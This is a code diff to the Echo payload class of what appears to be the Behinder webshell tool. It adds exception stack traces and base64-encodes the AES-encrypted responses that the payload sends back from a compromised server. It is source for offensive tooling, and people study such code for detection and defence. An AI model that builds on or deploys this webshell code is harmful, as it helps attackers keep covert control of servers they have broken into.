@@ -1,5 +1,6 @@
 package net.rebeyond.behinder.payload.java;
 
+import java.io.ByteArrayOutputStream;
 import java.lang.reflect.Method;
 import java.util.Iterator;
 import java.util.LinkedHashMap;
@@ -42,6 +43,7 @@ public class Echo {
                   so.getClass().getMethod("flush").invoke(so);
                   so.getClass().getMethod("close").invoke(so);
                } catch (Exception var14) {
+                  var14.printStackTrace();
                }
 
             }
@@ -54,6 +56,7 @@ public class Echo {
             so.getClass().getMethod("flush").invoke(so);
             so.getClass().getMethod("close").invoke(so);
          } catch (Exception var15) {
+            var15.printStackTrace();
          }
 
          return true;
@@ -66,6 +69,7 @@ public class Echo {
          so.getClass().getMethod("flush").invoke(so);
          so.getClass().getMethod("close").invoke(so);
       } catch (Exception var16) {
+         var16.printStackTrace();
       }
 
       return true;
@@ -78,7 +82,9 @@ public class Echo {
       Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
       cipher.init(1, skeySpec);
       byte[] encrypted = cipher.doFinal(bs);
-      return encrypted;
+      ByteArrayOutputStream bos = new ByteArrayOutputStream();
+      bos.write(encrypted);
+      return this.base64encode(bos.toByteArray()).getBytes();
    }
 
    private String buildJson(Map entity, boolean encode) throws Exception {
@@ -124,7 +130,7 @@ public class Echo {
 
    private String base64encode(byte[] data) throws Exception {
       String result = "";
-      String var4 = System.getProperty("java.version");
+      String version = System.getProperty("java.version");
 
       Class Base64;
       try {
